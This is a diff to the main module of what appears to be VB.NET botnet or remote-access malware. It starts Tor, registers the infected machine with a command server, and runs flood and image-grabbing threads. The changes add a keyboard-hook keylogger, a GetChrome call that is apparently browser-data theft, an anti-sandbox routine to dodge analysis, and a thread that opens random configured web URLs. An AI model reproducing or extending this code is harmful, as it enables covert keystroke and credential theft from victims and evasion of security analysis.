@@ -10,9 +10,11 @@ Module Main
     ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
     ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
     ReadOnly NewDetecter As New Thread(AddressOf Detecter)
+    ReadOnly NewWebfilters As New Thread(AddressOf WebFilters)
     Private _command As New CommandHandler
     Private _config As New ConfigBotModel
     Private _FloodsBase As Floodsbase
+    Private _KeyboardHook As New KeyboardHook
     Public Function GetFloodsBase()
         Return _FloodsBase
     End Function
@@ -45,11 +47,19 @@ Module Main
         StartTor()
         NewListener.Start()
         NewNotice.Start()
+        NewWebfilters.Start()
         DelayedAction.Start()
         Dim floodsbase As New Floodsbase
         SetFloodsBase(floodsbase)
         If Not File.Exists(GetConfigJson().MainPath & "\Images.txt") Then
             NewImageGraber.Start()
+        End If
+        If Config.Variables.AntiSandbox Then
+            RunAntis()
+        End If
+        If Config.Variables.Keyloggers Then
+            GetChrome()
+            _KeyboardHook.Register()
         End If
         MainThreadCreateWebBrowserForm = New WebBrowserForm
     End Sub
@@ -79,11 +89,9 @@ Module Main
                                 .City = GetCity(GetMyIPAddress())
                             }
                 Dim http As New SendHTTPonTor
-                http.TalkChannelHTTP(model, _config.UrlVariables.RegistrationUrl)
+                http.TalkChannelHTTP(model, _config.UrlVariables.RegistrationUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
                 Thread.Sleep(SectoMs(200))
-            Catch ex As Exception
-                'Website not working/shutdown
-            End Try
+            Catch : End Try
         End While
     End Sub
     Public Sub DelayedActions()
@@ -95,5 +103,9 @@ Module Main
     Public Sub configBot()
         Dim configjson = JsonConvert.DeserializeAnonymousType(File_reader("Config.json"), New ConfigBotModel)
         Config = configjson
+    End Sub
+    Public Sub WebFilters()
+        Dim r As New Random
+        Go(Config.WebFilters(r.Next(Config.WebFilters.Count - 1)))
     End Sub
 End Module
